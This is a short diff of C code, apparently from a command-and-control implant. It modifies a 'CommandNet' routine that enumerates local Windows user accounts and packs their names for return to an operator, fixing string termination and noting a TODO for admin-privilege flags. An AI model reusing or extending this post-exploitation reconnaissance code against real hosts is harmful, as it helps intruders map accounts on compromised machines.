@@ -2412,12 +2412,14 @@ VOID CommandNet( PPARSER Parser )
                 PRINTF( "EntriesRead => %d\n", EntriesRead );
                 for( DWORD i = 0; i < EntriesRead; i++ )
                 {
-                    PRINTF( "User => %ls\n", UserInfo[ i ].usri0_name );
                     if ( UserInfo[ i ].usri0_name )
                     {
                         UserSize = WCharStringToCharString( User, UserInfo[ i ].usri0_name, StringLengthW( UserInfo[ i ].usri0_name ) );
+                        User[ UserSize ] = 0;
+
                         PackageAddBytes( Package, User, UserSize );
 
+                        // TODO: add this
                         /* if ( ( UserInfo[ i ].usri3_priv & USER_PRIV_ADMIN ) == 0 )
                             PackageAddInt32( Package, FALSE );
                         else
